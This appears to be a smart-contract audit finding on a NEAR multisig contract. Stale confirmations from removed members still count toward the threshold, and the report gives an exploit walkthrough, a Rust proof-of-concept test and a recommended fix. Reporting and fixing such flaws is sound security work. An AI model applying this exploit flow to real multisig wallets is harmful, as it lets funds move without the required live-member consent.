### Title
Stale confirmations from removed members are still counted toward `num_confirmations`, allowing execution below the live-member threshold - (File: `multisig2/src/lib.rs`)

### Summary
`MultiSigContract::delete_member` only purges `confirmations` and `requests` entries for requests that the removed member *authored* (`r.member == member`), not for other requests that member had previously *confirmed*. `confirm()` then counts `confirmations.len() + 1 >= num_confirmations` without re-validating that every stored confirmer is still a current member, so a stale confirmation from an already-removed member is silently counted toward the threshold, allowing a request to execute with fewer than `num_confirmations` live members.

### Finding Description
The invariant that should hold is: `num_confirmations_from_live_members_at_execution == num_confirmations` (i.e., every confirmer whose entry is counted in `confirmations.get(&request_id)` must still satisfy `self.members.contains(&member)` at the moment `execute_request` runs). The code breaks this equality.

- `delete_member` (`multisig2/src/lib.rs:356-379`) removes outstanding *requests authored by* the deleted member (`self.requests.iter().filter_map(|(k, r)| if r.member == member ...)`), and for those requests removes both the request and its confirmations set. It also clears `num_requests_pk` for that member. It does **not** scan every other request's `confirmations: HashSet<String>` to strip out entries where the deleted member had confirmed someone else's request.
- `confirm()` (`multisig2/src/lib.rs:294-315`) reads the stored `confirmations` set for `request_id` and simply checks `confirmations.len() as u32 + 1 >= self.num_confirmations`. It never re-checks that the strings already present in that set correspond to accounts/keys still in `self.members`.
- `assert_valid_request` (`multisig2/src/lib.rs:407-423`) and `current_member` (`multisig2/src/lib.rs:322-339`) only validate the *caller* of the current transaction is a member; they do nothing about previously stored confirmer strings that may now be stale.

Exploit flow (all steps performed by the multisig's own governance, i.e. no full-access-key/foundation privilege needed beyond being one of the existing members):
1. Members = {alice, bob, key1, key2}, `num_confirmations = 3`.
2. `key1` creates request `R` (e.g. `Transfer`). `bob` calls `confirm(R)` → `confirmations[R] = {bob}`.
3. The group executes a separate `DeleteMember{bob}` self-request (reaching 3 confirmations from alice/key1/key2). `delete_member` removes `bob` from `members` and `num_requests_pk`, but `R` was authored by `key1`, not `bob`, so `confirmations[R]` still contains `"bob"`.
4. `alice` calls `confirm(R)` → `confirmations[R] = {bob, alice}`, count = 2, below threshold 3, not yet executed.
5. `key2` calls `confirm(R)` → inside `confirm`, `confirmations.len() (=2) + 1 >= num_confirmations (3)` is true → `execute_request` runs the `Transfer`.

At execution time the request only has two live confirmers (`alice`, `key2`); `bob` is no longer a member. The request executes moving funds with only 2 of 3 required live confirmations — the third slot is filled by a stale, no-longer-valid confirmation.

### Impact Explanation
This allows a multisig `Transfer` (or any other action, including further membership changes, `AddKey`, `FunctionCall`, etc.) to execute with fewer live confirmations than `num_confirmations` mandates, moving NEAR out of the multisig account without the required live-member consensus. This matches the Critical category: "a multisig request executed below `num_confirmations` live members." It is repeatable for every request that has at least one confirmation from a member who is later removed, and it compounds each time membership changes without a corresponding sweep of stale confirmations across all pending requests.

### Likelihood Explanation
The only precondition is normal multisig operation: at least one pending request accumulates a confirmation from a member, and that member is later removed via a standard `DeleteMember` governance action while the request remains pending (well within default `ACTIVE_REQUESTS_LIMIT` and before `REQUEST_COOLDOWN` deletion). No special privilege beyond ordinary multisig membership/governance is needed, and the bug is entirely deterministic — no timing race or external dependency required. This is a straightforward, always-reproducible defect in `delete_member`'s cleanup logic.

### Recommendation
When removing a member in `delete_member`, iterate all entries in `self.confirmations` (not just requests authored by that member) and strip the removed member's identity string from every confirmation set, or alternatively re-validate at `confirm()`/`execute_request` time that every stored confirmer string still belongs to a current member before counting it toward `num_confirmations`.

### Proof of Concept
```rust
#[test]
fn test_stale_confirmation_counted_after_removal() {
    // members(): alice (Account), bob (Account), key(Eg2j...) , key(TEST_KEY)
    let amount = 1_000;
    // key1 = Eg2j... , key2 = TEST_KEY
    testing_env!(context_with_key(
        PublicKey::from("Eg2jtsiMrprn7zgKKUk79qM1hWhANsFyE6JSX4txLEuy".parse().unwrap()),
        amount
    ));
    let mut c = MultiSigContract::new(members(), 3); // alice, bob, key1, key2; threshold 3

    // Step 1: key1 creates request R (transfer)
    let r = MultiSigRequest {
        receiver_id: bob(),
        actions: vec![MultiSigRequestAction::Transfer { amount: amount.into() }],
    };
    let request_id = c.add_request(r);

    // Step 2: bob confirms R
    testing_env!(context_with_account(bob(), amount));
    c.confirm(request_id);
    assert_eq!(c.get_confirmations(request_id).len(), 1); // {"bob"} stored

    // Step 3: remove bob via a separate DeleteMember self-request, confirmed by alice, key1, key2
    let del_req = MultiSigRequest {
        receiver_id: alice(),
        actions: vec![MultiSigRequestAction::DeleteMember {
            member: MultisigMember::Account { account_id: bob() },
        }],
    };
    testing_env!(context_with_account(alice(), amount));
    let del_id = c.add_request(del_req);
    c.confirm(del_id); // alice
    testing_env!(context_with_key(
        PublicKey::from("Eg2jtsiMrprn7zgKKUk79qM1hWhANsFyE6JSX4txLEuy".parse().unwrap()),
        amount
    ));
    c.confirm(del_id); // key1
    testing_env!(context_with_key(PublicKey::try_from(TEST_KEY.to_vec()).unwrap(), amount));
    c.confirm(del_id); // key2 -> executes DeleteMember{bob}

    // bob is no longer a member, but R's stale confirmation from bob is untouched
    assert_eq!(c.get_confirmations(request_id), vec!["bob".to_string()]);

    // Step 4: alice confirms R -> count = 2
    testing_env!(context_with_account(alice(), amount));
    c.confirm(request_id);
    assert_eq!(c.get_confirmations(request_id).len(), 2);

    // Step 5: key2 confirms R -> count check: len(2)+1 >= 3 -> EXECUTES
    // even though only alice & key2 are live confirmers (2 < num_confirmations=3)
    testing_env!(context_with_key(PublicKey::try_from(TEST_KEY.to_vec()).unwrap(), amount));
    c.confirm(request_id);

    // Request executed and removed despite only 2 live-member confirmations
    assert!(c.requests.get(&request_id).is_none());
}
```

    fn delete_member(&mut self, promise: Promise, member: MultisigMember) -> Promise {
        assert(
            self.members.len() - 1 >= self.num_confirmations as u64,
            "Removing given member will make total number of members below number of confirmations",
        );
        // delete outstanding requests by public_key
        let request_ids: Vec<u32> = self
            .requests
            .iter()
            .filter_map(|(k, r)| if r.member == member { Some(k) } else { None })
            .collect();
        for request_id in request_ids {
            // remove confirmations for this request
            self.confirmations.remove(&request_id);
            self.requests.remove(&request_id);
        }
        // remove num_requests_pk entry for member
        self.num_requests_pk.remove(&member.to_string());
        self.members.remove(&member);
        match member {
            MultisigMember::AccessKey { public_key } => promise.delete_key(public_key.into()),
            MultisigMember::Account { account_id: _ } => promise,
        }
    }
